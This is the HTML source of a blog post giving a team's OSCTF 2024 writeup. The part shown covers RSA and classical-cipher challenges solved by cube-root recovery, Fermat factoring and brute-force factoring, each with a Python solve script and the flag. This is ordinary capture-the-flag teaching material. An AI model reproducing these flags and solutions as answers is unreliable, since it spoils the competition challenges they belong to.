@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="队伍：ElCS1 排名：24 分数：5085 pts 师傅们都tql！ User Name Score Jerrythepro123 2230 sanmu 240 Dragonkeep &amp; LamentXU 2015 6s6 400 Aly1xbot 200 这次比赛我们队的osint和mi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="队伍：ElCS1 排名：24 分数：5085 pts 师傅们都tql！ User Name Score Jerrythepro123 2230 sanmu 240 Dragonkeep &amp; LamentXU 2015 6s6 400 Aly1xbot 200 这次比赛我们队的osint和mi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/10.png">
+<meta property="og:image" content="https://bu.dusays.com/2024/07/14/66937cb7dcf9a.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/12.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/13.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/15.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/16.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18301878/17.png">
+<meta property="article:published_time" content="2024-07-14T11:49:00.000Z">
+<meta property="article:modified_time" content="2024-07-14T11:49:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18301878/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-08-01-deadsecctf-2024-cry-flagkiller-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-07-07-ductf-2024-eics1-beginner-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&text=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&is_video=false&description=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)&body=Check out this article: https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&name=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&t=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Secret-Message"><span class="toc-number">1.1.</span> <span class="toc-text">The Secret Message</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Couple-Primesc"><span class="toc-number">1.2.</span> <span class="toc-text">Couple Primesc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Efficient-RSA"><span class="toc-number">1.3.</span> <span class="toc-text">Efficient RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Love-Story"><span class="toc-number">1.4.</span> <span class="toc-text">Love Story</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cipher-Conundrum"><span class="toc-number">1.5.</span> <span class="toc-text">Cipher Conundrum</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gophers-Language"><span class="toc-number">2.1.</span> <span class="toc-text">Gophers Language</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Another-Python-Game"><span class="toc-number">2.2.</span> <span class="toc-text">Another Python Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Broken-Sword"><span class="toc-number">2.3.</span> <span class="toc-text">The Broken Sword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Avengers-Assemble"><span class="toc-number">2.4.</span> <span class="toc-text">Avengers Assemble</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Leaky-Pipes"><span class="toc-number">3.1.</span> <span class="toc-text">Leaky Pipes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Buffet"><span class="toc-number">3.2.</span> <span class="toc-text">Buffer Buffet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Byte-Breakup"><span class="toc-number">3.3.</span> <span class="toc-text">Byte Breakup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seed-sPRING"><span class="toc-number">3.4.</span> <span class="toc-text">seed sPRING</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ShellMischief"><span class="toc-number">3.5.</span> <span class="toc-text">ShellMischief</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lib-Riddle"><span class="toc-number">3.6.</span> <span class="toc-text">Lib Riddle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coal-Mine-Canary"><span class="toc-number">3.7.</span> <span class="toc-text">Coal Mine Canary</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introspection"><span class="toc-number">4.1.</span> <span class="toc-text">Introspection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Indoor-WebApp"><span class="toc-number">4.2.</span> <span class="toc-text">Indoor WebApp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Style-Query-Listing%E2%80%A6"><span class="toc-number">4.3.</span> <span class="toc-text">Style Query Listing…?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heads-or-Tails"><span class="toc-number">4.4.</span> <span class="toc-text">Heads or Tails?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Action-Notes"><span class="toc-number">4.5.</span> <span class="toc-text">Action Notes</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-14T11:49:00.000Z" class="dt-published" itemprop="datePublished">2024-07-14</time>
+        
+        (Updated: <time datetime="2024-07-14T11:49:00.000Z" class="dt-updated" itemprop="dateModified">2024-07-14</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>队伍：ElCS1 排名：24 分数：5085 pts</p>
+<p><img src="/images/migrated/18301878/01.png"></p>
+<p>师傅们都tql！</p>
+<table>
+<thead>
+<tr>
+<th>User Name</th>
+<th>Score</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Jerrythepro123</td>
+<td>2230</td>
+</tr>
+<tr>
+<td>sanmu</td>
+<td>240</td>
+</tr>
+<tr>
+<td>Dragonkeep &amp; LamentXU</td>
+<td>2015</td>
+</tr>
+<tr>
+<td>6s6</td>
+<td>400</td>
+</tr>
+<tr>
+<td>Aly1xbot</td>
+<td>200</td>
+</tr>
+</tbody></table>
+<p>这次比赛我们队的osint和misc手没时间。导致取证，osint和misc难的都不会，简单的又没啥好写的，索性直接开摆了</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">Crypto</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">The Secret Message</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">Couple Primesc</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">Efficient RSA</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">Love Story</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">Cipher Conundrum</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2">Reverse(ak)</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2.1">Gopher Language</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2.2">Another Python Game</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2.3">The Broken Sword</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2.4">Avengers Assemble</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3">PWN(ak)</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.1">Leaky Pipes</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.2">Buffer Buffet</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.3">Byte Breakup</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.4">seed sPRING</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.5">ShellMischief</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.6">Lib Riddle</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.7">Coal Mine Canary</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4">Web(ak)</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.1">Introspection</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.2">Indoor WebApp</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.3">Style Query Listing</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.4">Heads or Tails?</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.5">Action Notes</a></li>
+</ul>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="The-Secret-Message"><a href="#The-Secret-Message" class="headerlink" title="The Secret Message"></a>The Secret Message</h2><p>难度：热身</p>
+<p>chall.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from Cryptodome.Util.number import getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(b&quot;REDACTED&quot;)</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p*q</span><br><span class="line">e = 3</span><br><span class="line"></span><br><span class="line">ciphertext = pow(flag, e, n)</span><br><span class="line"></span><br><span class="line">print(&quot;n: &quot;, n)</span><br><span class="line">print(&quot;e: &quot;, e)</span><br><span class="line">print(&quot;ciphertext: &quot;, ciphertext)</span><br></pre></td></tr></table></figure>
+
+<p>encrypted.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n:  95529209895456302225704906479347847909957423713146975001566374739455122191404873517846348720717334832208112563199994182911677708320666162110219260456995238587348694937990770918797369279309985690765014929994818701603418084246649965352663500490541743609682236183632053755116058982739236349050530235419666436143</span><br><span class="line">e:  3</span><br><span class="line">ciphertext:  123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125</span><br></pre></td></tr></table></figure>
+
+<p>看到e&#x3D;3直接释怀了</p>
+<p>没啥好说的，小指数明文攻击啥的可以端上来了</p>
+<p>但是这里因为e实在是太小了，导致了一种极端情况的出现</p>
+<p>m^e%n &#x3D; c, 由于m^e &lt; n, 导致 m^e &#x3D; c</p>
+<p>直接对c开三次根得到m，即为flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Cryptodome.Util.number import long_to_bytes</span><br><span class="line">import gmpy2</span><br><span class="line">n=  95529209895456302225704906479347847909957423713146975001566374739455122191404873517846348720717334832208112563199994182911677708320666162110219260456995238587348694937990770918797369279309985690765014929994818701603418084246649965352663500490541743609682236183632053755116058982739236349050530235419666436143</span><br><span class="line">e=  3</span><br><span class="line">ciphertext=  123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125</span><br><span class="line">print(long_to_bytes(gmpy2.iroot(ciphertext, 3)[0]))</span><br></pre></td></tr></table></figure>
+
+<p><strong>OSCTF{Cub3_R00Ting_RSA!!}</strong></p>
+<h2 id="Couple-Primesc"><a href="#Couple-Primesc" class="headerlink" title="Couple Primesc"></a>Couple Primesc</h2><p>难度：热身</p>
+<p>source.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sympy import nextprime</span><br><span class="line"></span><br><span class="line">flag = b&#x27;REDACTED&#x27;</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = nextprime(p)</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">c = pow(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">print(f&quot;n = &#123;n&#125;&quot;)</span><br><span class="line">print(f&quot;c = &#123;c&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>cipher</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = 20159884168863899177128175715030429666461733285660170664255048579116265087763268748333820860913271674586980839088092697230336179818435879126554509868570255414201418619851045615744211750178240471758695923469393333600480843090831767416937814471973060610730578620506577745372347777922355677932755542699210313287595362584505135967456855068550375989801913361017083952090117041405458626488736811460716474071561590513778196334141517893224697977911862004615690183334216587398645213023148750443295007000911541566340284156527080509545145423451091853688188705902833261507474200445477515893168405730493924172626222872760780966427</span><br><span class="line">c = 18440162368010249375653348677429595229051180035668845001125855048750591059785630865891877031796050869136099359028540172514890273415892550857190509410541828375948243175466417949548148007390803680005616875833010137407850955608659023797782656930905693262770473679394796595557898347900786445803645539553815614140428316398058138450937721961593146082399553119578102712100359284788650328835784603011091312735813903241087475279011862693938914825685547337081335030237385061397899718079346063519325222861490101383929790275635381333028091769118083102339908694751574572782030287570280071809896532329742115422479473386147281509394</span><br></pre></td></tr></table></figure>
+
+<p>注意到source中获取p，q时直接使用的nextprime，即两素数相差很近</p>
+<p>直接费马分解+RSA解密丝滑连招出flag</p>
+<p>使用yafu进行分解：</p>
+<p><img src="/images/migrated/18301878/02.png"></p>
+<p>得到p， q<br>正常RSA解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">p = 141985506897231941308512923885300128905042311260138568794604206121080701727914934144982091139843178794485634682609841794924046596349428012470654095827271229332196334064446305896952838867217202135745989681311949561794583125471246401285687229433924674917884710139141784537370509554520561718028000388149962362867</span><br><span class="line">q = 141985506897231941308512923885300128905042311260138568794604206121080701727914934144982091139843178794485634682609841794924046596349428012470654095827271229332196334064446305896952838867217202135745989681311949561794583125471246401285687229433924674917884710139141784537370509554520561718028000388149962362681</span><br><span class="line">n = 20159884168863899177128175715030429666461733285660170664255048579116265087763268748333820860913271674586980839088092697230336179818435879126554509868570255414201418619851045615744211750178240471758695923469393333600480843090831767416937814471973060610730578620506577745372347777922355677932755542699210313287595362584505135967456855068550375989801913361017083952090117041405458626488736811460716474071561590513778196334141517893224697977911862004615690183334216587398645213023148750443295007000911541566340284156527080509545145423451091853688188705902833261507474200445477515893168405730493924172626222872760780966427</span><br><span class="line">c = 18440162368010249375653348677429595229051180035668845001125855048750591059785630865891877031796050869136099359028540172514890273415892550857190509410541828375948243175466417949548148007390803680005616875833010137407850955608659023797782656930905693262770473679394796595557898347900786445803645539553815614140428316398058138450937721961593146082399553119578102712100359284788650328835784603011091312735813903241087475279011862693938914825685547337081335030237385061397899718079346063519325222861490101383929790275635381333028091769118083102339908694751574572782030287570280071809896532329742115422479473386147281509394</span><br><span class="line">e = 65537</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure>
+
+<p><strong>OSCTF{m4y_7h3_pR1m3_10v3_34cH_07h3r?}</strong></p>
+<h2 id="Efficient-RSA"><a href="#Efficient-RSA" class="headerlink" title="Efficient RSA"></a>Efficient RSA</h2><p>难度：热身</p>
+<p>chall.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Cryptodome.Util.number import getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">Flag = bytes_to_long(b&quot;REDACTED&quot;)</span><br><span class="line"></span><br><span class="line">p = getPrime(112)</span><br><span class="line">q = getPrime(112)</span><br><span class="line">n = p*q</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">ciphertext = pow(Flag, e, n)</span><br><span class="line"></span><br><span class="line">print([n, e, ciphertext])</span><br></pre></td></tr></table></figure>
+
+<p>encrypted.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[13118792276839518668140934709605545144220967849048660605948916761813, 65537, 8124539402402728939748410245171419973083725701687225219471449051618]</span><br></pre></td></tr></table></figure>
+
+<p>看到如此小的p和q谁能拒绝暴力分解n呢？</p>
+<p><img src="/images/migrated/18301878/03.png"></p>
+<p>得到q，p，正常RSA解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">p = 3058290486427196148217508840815579</span><br><span class="line">q = 4289583456856434512648292419762447</span><br><span class="line">n = 13118792276839518668140934709605545144220967849048660605948916761813</span><br><span class="line">c = 8124539402402728939748410245171419973083725701687225219471449051618</span><br><span class="line">e = 65537</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure>
+
+<p><strong>OSCTF{F4ct0r1Ng_F0r_L1f3}</strong></p>
+<h2 id="Love-Story"><a href="#Love-Story" class="headerlink" title="Love Story"></a>Love Story</h2><p>难度：热身(有hint之后)</p>
+<p>（吐槽：这都第多少个热身题了。。。）</p>
+<p>看hint源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def to_my_honey(owo):</span><br><span class="line">    return ord(owo) - 0x41</span><br><span class="line"></span><br><span class="line">def from_your_lover(uwu):</span><br><span class="line">    return chr(uwu % 26 + 0x41)</span><br><span class="line"></span><br><span class="line">def encrypt(billet_doux):</span><br><span class="line">    letter = &#x27;&#x27;</span><br><span class="line">    for heart in range(len(billet_doux)):</span><br><span class="line">        letters = billet_doux[heart]</span><br><span class="line">        if not letters.isalpha():</span><br><span class="line">            owo = letters</span><br><span class="line">        else:</span><br><span class="line">            uwu = to_my_honey(letters)</span><br><span class="line">            owo = from_your_lover(uwu + heart)</span><br><span class="line">        letter += owo</span><br><span class="line">    return letter</span><br><span class="line"></span><br><span class="line">m = &quot;REDACTED&quot;</span><br><span class="line">c = encrypt(m)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
+
+<p>这题放reverse里都是合适的（捂脸）</p>
